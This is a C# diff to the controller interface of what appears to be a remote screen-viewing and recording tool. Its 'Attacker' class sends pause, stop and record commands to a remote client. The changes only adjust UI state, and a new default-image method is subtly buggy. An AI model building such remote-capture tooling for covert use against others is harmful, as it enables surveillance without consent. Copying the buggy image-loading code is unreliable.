@@ -49,15 +49,22 @@ namespace ExtremLink_Client_v2.Pages
         private void PauseBtn_Click(object sender, RoutedEventArgs e)
         {
             Attacker.AttackerInstance.SendTCPMessageToClient("&", "PauseSendFrames");
+            this.isReceivingFrames = false;
+            this.LoadDefaultFrame();
         }
         private void StopBtn_Click(object sender, RoutedEventArgs e)
         {
             Attacker.AttackerInstance.SendTCPMessageToClient("&", "StopSendFrames");
+            this.isReceivingFrames = false;
+            this.LoadDefaultFrame();
         }
         private void RecordBtn_Click(object sender, RoutedEventArgs e)
         {
-            Attacker.AttackerInstance.SendTCPMessageToClient("&", "StartRecord");
-            this.recordingStatusTextBlock.Text = "Record: on"; 
+            if (!this.isReceivingFrames)
+            {
+                Attacker.AttackerInstance.SendTCPMessageToClient("&", "StartRecord");
+                this.recordingStatusTextBlock.Text = "Record: on";
+            }
         }
 
 
@@ -76,6 +83,7 @@ namespace ExtremLink_Client_v2.Pages
 
         private async void UpdateFrame()
         {
+            
             while (this.isReceivingFrames)
             {
                 try
@@ -87,6 +95,10 @@ namespace ExtremLink_Client_v2.Pages
                     }
                     // Set the sleep function so the frame rate will be around ~30 FPS
                     await Task.Delay(32);
+                    if (!this.isReceivingFrames)
+                    {
+                        break;
+                    }
                 }
                 catch (Exception ex)
                 {
@@ -96,6 +108,16 @@ namespace ExtremLink_Client_v2.Pages
             }
         }
 
+        private void LoadDefaultFrame()
+        {
+            // Input: Nothing.
+            // Output: The function loads the defualt non frame image.
+            BitmapImage bitmap = new BitmapImage();
+            bitmap.BeginInit();
+            bitmap.UriSource = new Uri("\\Images\\default_image.png", UriKind.Relative);
+            bitmap.EndInit();
+            Dispatcher.InvokeAsync(() => frameImg.Source = new BitmapImage(new Uri("Images/myphoto.jpg")));
+        }
 
         // Mouse functions:
         private void FrameImg_MouseMove(object sender, MouseEventArgs e)
